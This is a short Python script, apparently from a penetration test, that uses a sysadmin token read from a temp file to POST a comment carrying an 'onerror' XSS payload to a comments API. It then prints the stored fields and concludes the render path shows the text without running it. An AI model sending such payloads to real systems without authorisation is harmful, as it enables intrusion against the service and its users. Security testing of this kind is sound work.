import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
TOK=open('/tmp/bac_SYSADMIN').read().strip()
def post(body):
    cmd=['curl','-s','-m','30','-o','/tmp/b','-w','%{http_code}','-X','POST',H+'/api/v1/comments',
         '-H','token: '+TOK,'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System','-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
tag='ZXV'+uuid.uuid4().hex[:5]
print("=== re-verify: what does the API store for a raw onerror payload? ===")
pay=f'<img src=x onerror=alert(document.domain)>{tag}'
c,b=post({"comment":{"type":"Comment","commentable_type":"ExceptionRequest",
                     "commentable_id":33,"message_raw":pay}})
print(f"  POST message_raw only -> {c}")
if c in ('200','201'):
    o=json.loads(b)['comments'][0]
    print(f"    id={o['id']}")
    print(f"    message_raw  = {o.get('message_raw')!r}")
    print(f"    message_html = {o.get('message_html')!r}")
    print()
    print("  NOTE: message_html is EMPTY -> the client never sanitised it")
    print("  The render path uses messageRaw as TEXT (commentParagraphs), so no execution.")
